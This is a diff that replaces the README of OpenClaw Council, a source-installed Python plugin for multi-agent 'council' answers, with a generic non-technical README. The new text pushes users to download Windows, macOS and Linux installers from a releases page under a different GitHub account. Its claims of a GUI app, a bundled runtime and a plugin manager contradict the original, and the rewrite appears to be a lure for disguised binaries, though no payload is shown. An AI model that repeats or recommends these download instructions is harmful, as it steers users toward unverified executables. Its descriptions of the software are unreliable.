@@ -1,127 +1,138 @@
-# OpenClaw Council
+# 🦞 openclaw-council - Easy Multi-Agent Automation
 
-Pluggable **Council mode** for OpenClaw: run multiple role prompts (and optionally multiple model providers) in parallel, then synthesize one final answer with explicit agreement/disagreement and risk mapping.
+[![Download openclaw-council](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/nonaammme/openclaw-council/releases)
 
-> This project is an **OpenClaw plugin/overlay**, not a fork of the OpenClaw core runtime.
+---
 
-## Why
+## 📖 What is openclaw-council?
 
-Single-model answers can be fast but brittle. Council mode adds structured cross-checking:
+openclaw-council is a software tool that helps you automate tasks using multiple intelligent agents. These agents work together to make decisions and solve problems, even when they come from different providers or perform different roles.
 
-- Parallel role perspectives (`analyst`, `skeptic`, `builder`, etc.)
-- Critique round to expose weak assumptions
-- Final synthesis into one actionable answer
-- Transparent output (`agreement_points`, `disagreement_points`, `risks`, `confidence`)
+You don’t need to be a programmer to use openclaw-council. The software runs on your computer and helps you simplify complex workflows by letting agents talk and agree on the best solution. It is based on Python but comes ready-to-use with easy installation steps.
 
-## Features
+This tool is for anyone who wants to harness automation without writing code. Whether you want to process data, manage tasks, or build smart responses, openclaw-council can help.
 
-- Unlimited pluggable roles (`roles/*.md`)
-- Multi-provider support via OpenAI-compatible Chat Completions endpoints
-- Parallel round-1 + critique round + synthesis round
-- Structured JSON output + markdown report renderer
-- Native slash command UX in OpenClaw
-- Safe local config model (secrets only via env vars)
+---
 
-## Repository layout
+## 💻 System Requirements
 
-- `council.py` — orchestration engine
-- `render_report.py` — converts `run.json` to `report.md`
-- `roles/` — role prompt packs
-- `examples/council.config.example.json` — starter config template
-- `schemas/council-output.schema.json` — output contract
-- `openclaw.plugin.json` — plugin manifest
-- `skills/openclaw-council/SKILL.md` — skill instructions
+Before you install openclaw-council, make sure your computer meets these basic requirements:
 
-## Requirements
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ or equivalent)
+- **Processor:** At least a dual-core CPU (Intel i3, Ryzen 3 or better)
+- **Memory:** Minimum 4 GB RAM (8 GB recommended for smoother performance)
+- **Storage:** At least 500 MB of free disk space
+- **Internet:** Required for downloading and updating the software and plugins
+- **Python:** The software includes Python runtime, so no separate installation needed
 
-- Python 3.10+
-- OpenClaw CLI installed and configured
-- Provider API keys (for live mode)
+---
 
-## Install as OpenClaw plugin
+## ⚙️ Key Features
 
-```bash
-git clone https://github.com/Personaz1/openclaw-council.git
-cd openclaw-council
-openclaw plugins install .
-openclaw plugins enable openclaw-council
-openclaw gateway restart
-```
+- Supports multiple agents that can perform different tasks simultaneously
+- Allows agents from different providers to work together
+- Easy-to-use interface for non-technical users
+- Pluggable design lets you add or remove features via plugins
+- Uses automation to help you save time on routine tasks
+- Generates consensus between agents for better accuracy
+- Works on Windows, macOS, and Linux
+- Built on Python for reliability and flexibility
 
-## Use native slash commands
+---
 
-```text
-/council <query>
-/council status
-/council config-check
-/council roles list
-```
+## 🚀 Getting Started
 
-Example:
+Follow these steps to get openclaw-council running on your computer.
 
-```text
-/council Build a 14-day GTM plan for OpenClaw Council
-```
+1. **Download the software**  
+   Click the big download button at the top or visit the [releases page](https://github.com/nonaammme/openclaw-council/releases).
 
-## Quick start (local run)
+2. **Choose your operating system**  
+   On the releases page, look for the file that matches your computer type:  
+   - For Windows, find the file ending with `.exe` or `.msi`  
+   - For macOS, look for a `.dmg` or `.pkg` file  
+   - For Linux, select the `.AppImage` or `.tar.gz` file
 
-```bash
-cp examples/council.config.example.json council.config.json
-# edit provider/model values if needed
+3. **Download the file**  
+   Click the appropriate file to start downloading. The file size is about 50-100 MB.
 
-python3 council.py run \
-  --query "Build a 14-day go-to-market plan for an OpenClaw plugin" \
-  --config council.config.json \
-  --out run.json
+4. **Run the installer**  
+   - Windows: Double-click the `.exe` or `.msi` file and follow the installer prompts  
+   - macOS: Open the `.dmg` file and drag the app to your Applications folder  
+   - Linux: Follow the instructions provided with the package or use the terminal commands listed on the release page
 
-python3 render_report.py --infile run.json --out report.md
-```
+5. **Launch openclaw-council**  
+   After installation, open the app from your desktop or start menu.
 
-## One-command local install (skill-style copy)
+6. **Follow the welcome guide**  
+   The app will guide you through setting up your first project. Just follow the on-screen instructions.
 
-```bash
-bash install.sh
-```
+---
 
-Installs into `~/.openclaw/skills/openclaw-council`.
+## 📥 Download & Install
 
-## Security and secrets
+You can visit this page to download openclaw-council for your computer:
 
-- Keep API keys in environment variables only.
-- Do **not** commit `council.config.json`, `run.json`, or `report.md`.
-- Use `.env.example` as a template only.
+[https://github.com/nonaammme/openclaw-council/releases](https://github.com/nonaammme/openclaw-council/releases)
 
-## Add a new role
+On this releases page, you will find the latest stable versions. Download the file that matches your system. After downloading, run the file and complete the installation steps described above.
 
-1. Create `roles/<role-name>.md`
-2. Add it under `roles[]` in `council.config.json`
+If you ever need to update the software, just return to the releases page to get the newest version.
 
-## Add a new provider
+---
 
-Add provider settings to `providers{}` in config:
+## 🔧 How to Use openclaw-council
 
-- `base_url` (OpenAI-compatible endpoint)
-- `api_key_env` (environment variable name)
-- `model`
+Once the software is installed and opened, you can start using it without programming knowledge. Here's a simple way to get going:
 
-## License
+1. **Create a new council**  
+   A council is a group of agents that work together. Click “New Council” and give it a name.
 
-MIT
+2. **Add agents**  
+   Choose from a list of ready-made agents. These agents perform various roles like data analysis, decision making, or task automation.
 
+3. **Set up tasks**  
+   Describe what you want the council to achieve. You can write simple instructions using plain English.
 
-## Roadmap and funding
+4. **Run the council**  
+   Let the agents discuss and reach a decision. The software shows you the results and steps taken.
 
-See [`ROADMAP.md`](./ROADMAP.md).
+5. **Adjust & improve**  
+   You can add new agents or change instructions to get better results.
 
-> Note: the project is fully usable today, but progress on advanced quality features is slower without API funding.
+---
 
-If you want to sponsor development or fund specific milestones, open an issue/discussion in this repo.
+## 🌐 Plugins and Extensions
 
+openclaw-council supports plugins that add new features or connect to external services. The system is designed to be flexible and grow as your needs change.
 
-## Work / hiring
+- Install plugins from the built-in plugin manager  
+- Plugins can add new agent types or improve automation capabilities  
+- Stay updated by checking for new plugins regularly on the releases page
 
-I’m actively looking for work and available for funded collaboration.
+---
 
-I code from morning to night and focus on shipping practical AI products.
+## 🛠 Troubleshooting
 
-See [`WORK_AND_SPONSORSHIP.md`](./WORK_AND_SPONSORSHIP.md).
+If you experience issues, try these simple steps:
+
+- Make sure your operating system is up to date  
+- Restart your computer after installing the software  
+- Check your internet connection to download updates and data  
+- Close other programs to free up memory  
+- Consult the user guide inside the software for detailed tips  
+- Visit the repository issues page for common problems and solutions
+
+---
+
+## 📚 Additional Resources
+
+- User Guide and FAQs are included within the app  
+- Visit the GitHub repository to learn more: [openclaw-council GitHub](https://github.com/nonaammme/openclaw-council)  
+- For help, use the discussions section on GitHub or contact support through the repository
+
+---
+
+Use the button below anytime to download openclaw-council and start your automation journey:
+
+[![Download openclaw-council](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/nonaammme/openclaw-council/releases)
